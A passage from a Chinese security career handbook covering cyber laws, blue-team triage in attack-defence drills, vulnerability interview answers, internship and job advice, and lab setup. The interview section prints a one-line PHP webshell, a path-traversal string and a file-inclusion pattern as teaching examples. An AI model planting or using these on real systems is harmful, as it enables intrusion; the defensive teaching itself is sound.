- 网络运营者义务：安全保护、应急预案、实名制、数据留存（日志至少 6 个月）
- **第 59 条**：不履行保护义务，责令改正、警告，罚款（单位 1–10 万起）

### 2. 《数据安全法》（2021.9.1 施行）

- **数据分类分级保护制度**：核心数据、重要数据、一般数据
- 重要数据目录由各地区各部门制定；重要数据出境要安全评估
- 一句话："数据安全法管的是数据本身，不管它是谁的。"

### 3. 《个人信息保护法》（2021.9.1 施行）

- 原则：**告知—同意**、最小必要、目的明确
- **敏感个人信息**：人脸、健康、金融账户、行踪轨迹等，需单独同意
- 重罚条款：情节严重可处**五千万元以下或上一年度营业额百分之五以下**罚款——这个数字是面试谈资

### 4. 《关键信息基础设施安全保护条例》（2021.9.1 施行）

- 关基：能源、交通、水利、金融、公共服务、电子政务等领域，**一旦破坏危害国家安全和公共利益**的设施
- 运营者义务：在等保基础上，**每年至少一次检测评估**、安全审查、采购审查
- 一句话："等保是底线，关基是重点保护对象。"

### 5. 《刑法》第 285、286 条（红线，背下来）

- **285 条**：非法侵入计算机信息系统罪、非法获取计算机信息系统数据罪（含工具提供罪）
- **286 条**：破坏计算机信息系统罪
- 一句话："没授权的扫描、登录、下载，都可能构成犯罪——这是为什么我只打自己的靶场。"

### 6. 工控相关（你的差异化）

- 工信部《工业控制系统信息安全防护指南》（2016）：工控安全的"十项要求"，与等保 2.0 工控扩展要求一脉相承
- 《工业互联网创新发展行动计划》等政策 → 说"国家在推工业互联网，安全是配套刚需"

### 7. 面试怎么答"你了解哪些安全法规"

标准答法：**"网络安全法（等保制度的法律依据）、数据安全法（分类分级）、个人信息保护法（敏感信息单独同意，最高可罚营业额的 5%）、关键信息基础设施条例（每年检测评估），刑法 285/286 是底线。工控方向还了解工信部的防护指南。"**——一口气说全，直接碾压大多数应届生。

### 8. 记忆方法

把四部法记成四个词：**网安法=等保**、**数安法=分类分级**、**个保法=同意+5%**、**关保条例=每年检测**。一周背一条，一个月滚熟。

### 2. HTTP 请求（带重试）

```python
import requests

def get(url, retries=3, timeout=10):
    headers = {"User-Agent": "Mozilla/5.0"}
    for i in range(retries):
        try:
            r = requests.get(url, headers=headers, timeout=timeout)
            r.raise_for_status()
            return r
        except requests.exceptions.Timeout:
            print(f"超时，第 {i+1} 次重试...")
        except requests.exceptions.RequestException as e:
            print(f"请求失败：{e}")
            break
    return None

r = get("https://quotes.toscrape.com/")
if r:
    print(r.status_code, len(r.text))
```

## 护网（HW）经验速成：你秋招前最强的实习机会

### 0. 什么是护网

每年国家组织的**网络安全实战攻防演练**（业内叫 HW/HVV，通常在夏天）：红队（攻击方）打一批真实系统，蓝队（防守方）守。乙方安全公司大量招**蓝队初级人员**——这是**应届生/在校生进安全行业性价比最高的入口**：

- 专科可参加，门槛比渗透岗低
- 短期项目、有收入（日薪制）
- 一次 HW = 一段能写进简历的实战经历
- **2027 年的 HW 正好在你秋招（2027.9）之前**——天时完美

### 1. 蓝队每天在干嘛

盯告警 → 研判（真攻击还是误报）→ 处置/上报 → 溯源（攻击者怎么进来的）→ 写日报。

日常就是三件事：**看设备告警（SIEM/IPS/WAF）、分析日志、写报告**。

### 2. 入门要求（不神秘，你现在就能开始练）

1. 会看日志：登录日志、Web 访问日志
2. 懂常见攻击流量特征（见下）
3. 能写清楚的日报

### 3. 高频研判场景（面试必问，背）

| 场景 | 怎么判断 |
|---|---|
| **扫描流量** | 同一源 IP 短时间内访问大量端口/路径，大量 404；用 `nmap -sV` 跑一下自己靶机看特征 |
| **爆破流量** | 同源 IP 短时间大量登录失败（看 401/403/登录失败日志） |
| **webshell 上传成功** | 上传请求返回 200 + 之后该文件有访问记录 + 文件内容有 `eval`/`base64_decode` 特征 |
| **命令注入成功** | URL/参数里带 `;`、`\|`、`&&`，响应里有 `whoami`/`id` 的回显 |
| **异常外联** | 内网主机主动连陌生公网 IP 的非 80/443 端口（可能是 C2 心跳） |

### 4. 蓝队面试高频题

2. 怎么判断爆破成功？（登录失败次数 + 之后是否有成功登录记录）
3. webshell 怎么查？（流量特征 + 文件特征 + 访问日志，见 （见本文件【27_应急响应手册.md】一节））
4. 日报写什么？（今日告警数、研判结果、处置动作、待办）
5. 会写规则吗？（概念：在 WAF/IDS 上写检测规则——你会打 DVWA，就知道该拦什么）

### 5. 从现在到 2027 年 6 月的准备清单

# 36. 【36_常见漏洞面试补充题.md】

## 常见漏洞面试补充题（答案要点版）

> 配合 （见本文件【35_求职包_简历模板_面试题_2028届.md】一节） 使用。每周末刷 5 题。

1. **SSRF 是什么？有什么危害？**
服务端替攻击者发起请求。危害：探测内网端口、读云元数据（169.254.169.254）、打内网服务。防御：URL 白名单、禁内网 IP、禁重定向。

2. **XXE 是什么？**
XML 解析器处理了外部实体。可读文件、SSRF、DoS。防御：禁用外部实体（DTD）。

3. **反序列化漏洞原理？**
把数据还原成对象时执行了攻击者构造的逻辑（Java/PHP 高发）。防御：白名单类、不信任外部输入、更新组件。

4. **越权是什么？分几类？**
水平越权（A 看到 B 的同级数据）、垂直越权（普通用户干管理员的事）。防御：服务端每次校验身份与资源归属。

5. **逻辑漏洞常见有哪些？**
支付金额篡改、验证码绕过、注册参数污染、优惠券叠加、密码重置不验证。特点：扫描器扫不出，只能人脑测。

6. **未授权访问常见哪些服务？**
Redis（6379）、MongoDB（27017）、Memcached、Elasticsearch、Docker API。防御：绑内网、加认证、防火墙。

7. **任意文件读取/下载怎么防？**
路径参数白名单、禁止 `../`、限定根目录。

8. **目录遍历和文件包含有什么区别？**
目录遍历：读文件内容（`../../etc/passwd`）；文件包含：把文件当代码执行（`include $_GET['file']`）。

9. **一句话木马是什么？**
`<?php eval($_POST['x']); ?>` 这类极短的后门。检测：文件内容特征、流量特征、上传目录监控。

10. **免杀是什么概念？**
让木马绕过杀软/EDD 检测（改特征、加密、混淆）。面试说概念即可，别现场演示。

11. **中间件常见漏洞举例？**
Weblogic 反序列化、Tomcat 管理后台弱口令/部署 war、Struts2 命令执行（S2-045）。防御：升级、删管理后台、改默认配置。

12. **WAF 绕过有哪几类思路？**
编码变形（大小写/双写/URL 编码）、注释符替换、分块传输、协议层差异。别展开讲细节，说"思路是让特征匹配失效"。

13. **供应链攻击是什么？**
通过第三方组件/软件/供应商打进目标（如投毒开源包）。防御：资产清单、来源校验、最小依赖。

14. **云安全常考点？**
对象存储桶权限错误（公开读）、SSRF 读元数据、IAM 权限过大。防御：最小权限、桶私有、日志审计。

15. **JWT 是什么？安全点在哪？**
JSON Web Token，三段式（header.payload.signature）。坑：`alg=none`、弱密钥、泄露。防御：强制算法、强密钥、短有效期。

16. **短信轰炸/验证码绕过怎么防？**
频率限制（IP+手机号）、图形验证码、服务端校验。

17. **撞库和拖库有什么区别？**
拖库：从目标网站偷出账号库；撞库：拿别处的库去目标网站试（防：验证码、风控、强制改密）。

18. **蜜罐在防守里的作用？**
引流、拖延、抓攻击者行为、溯源。面试会问 Conpot（工控蜜罐）——你有。

19. **零信任是什么？**
默认不信任任何内外部流量，每次都验证（设备+身份+权限），最小化授权。

20. **攻防演练里红队和蓝队分别干嘛？**
红队模拟真实攻击找突破；蓝队防守、监测、应急、溯源。你去蓝队（见 （见本文件【34_护网HW经验速成.md】一节））。

# 37. 【37_面试沟通与薪资谈判手册.md】

## 面试沟通与薪资谈判手册（HR 关的答案都在这）

### 1. HR 高频 15 题（每题一句话思路）

1. **自我介绍**（必考）：专业 → 为什么做安全 → 我有什么（项目/证书/实习），2 分钟
2. **为什么选我们公司**：提前查公司业务一句话 + 结合你的工控方向
3. **你的缺点**：说真缺点 + 正在怎么改（"我英语底子差，正在每天 15 分钟补技术词"）
4. **为什么机械专业转安全**：工控安全需要懂设备和现场的人，我两边都沾——见 （见本文件【30_工控安全面试专题20题.md】一节） 第 20 题
5. **期望薪资**：见下面第 2 节，别先报数
6. **到岗时间**：应届生答"毕业即到岗；实习随时"
7. **职业规划**：一年上手安服/测评 → 三年独立负责项目 → 往工控安全专
8. **学历（专科）**：不回避："学历是我现在补不上的，但动手能力和证书我能给证据"
9. **家住哪/接受出差吗**：如实；出差说清"接受、清楚这行是常态"
10. **手上还有其他 offer 吗**：诚实说"在面 X 家，但更想来这里因为 Y"
11. **能接受加班吗**：答"接受项目需要的加班，会优先提升效率"，别反提问
12. **说说实习经历**：STAR 讲，提前练熟
13. **你的优势**：懂工控 + 会动手 + 有作品 + 有打卡习惯（自律证据）
14. **有什么想问我们的**：团队分工 / 出差频率 / 新人培养 / 转正标准
15. **最后还有什么补充**：30 秒把最想被记住的一点再说一遍（比如"我能独立写报告"）

### 2. 期望薪资怎么答（应届生公式）

**"我对薪资的理解是：先看成长空间，其次符合市场。我了解过这个岗位应届的大致范围，具体数字拿到 offer 时再谈，我更关心进来之后三年能到什么位置。"**

要点：
- HR 问薪资=摸底，谁先报数谁被动
- 被追问就报**区间**（查过行情再报）："X–Y，看岗位职责和五险一金"
- 永远问清：底薪、绩效、年终、五险一金基数、出差补贴——**月薪 6000 全额缴社保 ≠ 月薪 8000 按最低基数**

### 3. 投递话术（BOSS/招聘软件开场白）

```
您好，我是 2028 届机械制造及自动化专业学生，方向是工控安全。
自学了 Web 安全（DVWA 全关卡）和工控协议（Modbus/OpenPLC），
有 GitHub 项目和个人练习报告，可立即到岗实习。简历如下，方便聊两句吗？
```

跟进（3 天没回）："您好，简历发过 X 天没动静，想确认下这个岗位还在招吗？"
被拒："谢谢反馈。能请教一句我哪方面最需要补吗？"（**被拒也要问，白捡的信息**）

### 4. 邮件模板（投简历用）

```
主题：应聘【岗位名称】- 张三 - 2028届 - 可立即实习
正文：
您好，我是 XX 职业技术学院机械制造及自动化专业 2028 届学生。
我的方向和贵司【岗位/业务】匹配：______（一句话）。
三个事实：① DVWA 四类漏洞全通关并有迷你报告；② 用 OpenPLC+Modbus
搭过工控仿真并输出暴露面报告；③ 证书/比赛：______。
简历见附件，项目链接：______。盼复，谢谢！
```

### 5. 谈 offer 时的铁规矩

1. **一切以书面为准**——口头承诺 = 没有承诺
2. 确认：薪资构成、五险一金基数、试用期与打折、出差补贴、违约金条款
3. 违约金条款要三思——应届生被坑大多在这一条
4. 签三方前跟学校就业处核对流程

### 6. 红线（出现就走）

交钱入职 / 培训贷 / 扣押证件原件 / 无合同先干活 / 让你做未授权的攻击测试。

# 39. 【39_实习期生存手册.md】

## 实习期生存手册（寒假实习 = 整条路最关键的一步）

### 0. 先想清楚：实习的目标不是赚钱

是这三样，按优先级：
1. **一段能写进简历、能展开讲 5 分钟的经历**
2. **一份带教/公司的认可**（转正机会、内推、背调推荐人）
3. 学点真东西 + 一点点补贴

### 1. 入职前（一天搞定）

- 确认书面内容：实习协议、岗位职责、实习期、补贴多少、每周几天
- 记下带教的名字、联系方式；问清"我的第一周干什么"
- 准备三样：简历电子版、证件、一个笔记本（好记性不如烂笔头，记笔记的实习生最受欢迎）

### 2. 第一周（决定印象）

- 领任务时**复述一遍**："您的意思是让我做 A、B、C，周四前交，对吗？"——确认听懂比装懂强十倍
- 不懂就问，但先自己查 10 分钟（带教最烦两种人：不懂装懂、张嘴就问）
- 每天下班前给带教发一句话小结："今天完成了 X，卡在 Y，明天做 Z"——这 3 行话是实习生最便宜的加分项

### 3. 干活五原则

1. 交东西前**自己检查一遍**（错字、截图、格式）——别让带教给你当校对
2. 遇到"不会"说"**我去学一下**"，而不是"我不会"
3. 承诺了时间就守时；做不到提前说，别拖到 deadline 才讲
4. 别人说话时别打断；客户面前别插嘴
5. 每天写一点点复盘（带数字），实习结束就有现成的总结

### 4. 红线（踩一条就可能提前走人）

- 不碰**未授权**的系统、数据、账号
- 不把客户数据、公司资料发到自己邮箱/网盘
- 不私下接单、不拿客户联系方式接私活
- 不迟到、不玩手机、不在群里乱说话
- 不在社交平台发公司内部信息（含截图）

### 5. 实习总结怎么写（照这个结构）

```
1. 一句话：在 XX 公司安全服务部实习 X 个月，参与 XX 项目
2. 带数字：独立完成 Y 项配置核查 / 写了 Z 份报告 / 参与了 N 次现场测评
3. 学到什么：流程、工具、沟通（各一句）
4. 一个细节：某次具体问题你怎么解决的（面试时展开讲这段）
```

### 6. 怎么争取转正/内推

实习最后两周，主动找带教聊一次：
"我挺喜欢这里，也觉得自己上手了。毕业季有没有转正或推荐的机会？如果有，我需要补什么？"
——被拒绝也不亏，你知道了差距。**不问 = 一定没有。**

### 7. 一句话

**实习的第一目标，是让带教在背调时愿意为你说好话。** 这比那点补贴值钱一百倍。

# 40. 【40_第一份工作避坑手册.md】

## 第一份工作避坑手册（2028 年 6 月用）

> 应届生被坑基本都在这几件事上。签任何字之前，对着这份查一遍。

### 1. 合同（签之前逐条看）

- [ ] 职位、工作地点写清楚（"服从安排"要问清）
- [ ] 薪资构成：底薪多少、绩效怎么算、年终几个月——**只写"面议"或没数字的别签**
- [ ] 试用期：最长 6 个月（3 年以上合同）、不低于转正的 80%、**试用期也必须签合同、缴社保**
- [ ] 违约金条款：除竞业/培训服务期外，一般不得约定违约金——出现大额违约金要三思
- [ ] 合同两份，你手里必须留一份

### 2. 五险一金

- [ ] 入职当月问：公积金比例多少、按什么基数缴（**按最低基数 vs 按实际工资，差很多**）
- [ ] 试用期就开始缴——不缴是违法
- [ ] 异地办公问清社保缴在哪个城市（影响看病、公积金贷款）

### 3. 租房（去新城市的第一件事）

- [ ] 押金写进合同，拍照+视频留底（退租扯皮全靠它）
- [ ] 通勤控制在 40 分钟内——刚入行精力比房租重要
- [ ] 别押一付三还被收"中介费+服务费"双重

### 4. 档案与报到

- [ ] 毕业时档案去向：公司有资质就转公司，否则转回生源地人才市场——**档案千万别自己拿在手里**
- [ ] 报到证/毕业证/学位证拍照存档，原件不外借（办入职现场用，用完拿回）

### 5. 反套路清单（任何一条出现，扭头就走）

1. 先交钱：报名费、培训费、服装费、押金——**正规公司不会向员工收钱**
2. 培训贷："先培训后上岗，学费从工资扣"——这不是工作，是贷款
3. 扣证件："身份证/毕业证先押在公司"——违法
4. 无合同先干活："先干 3 个月看表现再签"——这 3 个月没人管你
5. 画饼："现在工资低，年底翻倍"——**合同上没写 = 没有**

### 6. 第一年最该做的三件事（比技术重要）

1. **社保不断缴**——断缴影响太多东西
2. **攒 3–6 个月生活费**——这是你敢跳槽、敢拒绝烂活的底气
3. **每周雷打不动学 3 小时**——第一年不学，第三年就后悔

### 7. 一句话

**合同上的字，比面试官说的话算数。** 拿不准的条款，拍照问学校就业处老师、问家里长辈，别自己猜。

# 42. 【环境搭建故障排查手册】

> 今晚装环境，卡住先来对号入座。原则：读报错最后一行 → 原文贴搜索引擎 → 查端口/权限/版本三件套。

## 1. VMware + Kali

| 症状 | 原因 | 解决 |
|---|---|---|
| 无法导入 .ova | 下载损坏 | 重新下载，校验 SHA256 |
| 开机黑屏/卡死 | 3D 加速问题 | 虚拟机设置 → 显示器 → 关 3D 加速 |
| VMware 报与 Hyper-V 冲突 | Windows 开了 WSL2/Hyper-V | 升级到新版 VMware；或临时关 Hyper-V |
| 内存不足提示 | 分配过大 | Kali 给 4–8G 即可 |
| 复制粘贴不通 | 没装增强工具 | sudo apt install open-vm-tools-desktop 然后重启 |
| 上不了网 | 网络模式 | 设 NAT；终端 dhclient 重新要 IP |
| 登录密码 | 默认 | kali / kali，登录后立刻改 |

## 2. DVWA

docker 方式：

| 症状 | 原因 | 解决 |
|---|---|---|
| 端口被占 | 80 被 XAMPP/IIS 占了 | docker run -p 8080:80 换端口 |
| setup 点不动 | 数据库没建 | 先点 Create/Reset Database |
| 登录失败 | 默认凭据 | admin / password |
| 中文乱码 | 编码问题 | 不影响实验，先不管 |

XAMPP 方式：

| 症状 | 原因 | 解决 |
|---|---|---|
| Apache 起不来 | 80 端口被占 | netstat -ano 查占用 → 改 httpd.conf 端口 |
| MySQL 起不来 | 3306 被占 | 同上改 my.ini |
| 上传的文件 404 | 目录不对 | 去 hackable/uploads 下找 |

## 3. OpenPLC

| 症状 | 原因 | 解决 |
|---|---|---|
| 网页打不开 | 用错协议 | http://localhost:8080（http 不是 https） |
| 502 连不上 | Runtime 没启动 | 看 OpenPLC Runtime 图标是否在跑 |
| pymodbus 报错 | 版本写法不同 | 新版：from pymodbus.client import ModbusTcpClient |
| 程序上传报错 | Editor/Runtime 版本不匹配 | 官网下同版本，先传示例程序 |

## 4. WSL2 Kali（虚拟机实在装不动时）

```
wsl --install -d kali-linux   # 管理员 PowerShell 里
wsl --set-default-version 2
```

轻、快，但网络模型特殊——练命令够用，做完整靶场网络实验不如虚拟机。

## 5. 排查心法（背下来）

1. 读报错最后一行——99% 的答案在最后一行
2. 复制报错原文 → 搜索引擎（加上软件名/系统名）
3. 依次查三件套：端口被谁占？权限够不够？版本对不对？
4. 半小时没解决 → 截图 + 报错原文记进打卡"卡在哪"，明天再来。别熬夜死磕，第二天一眼就能看出来。
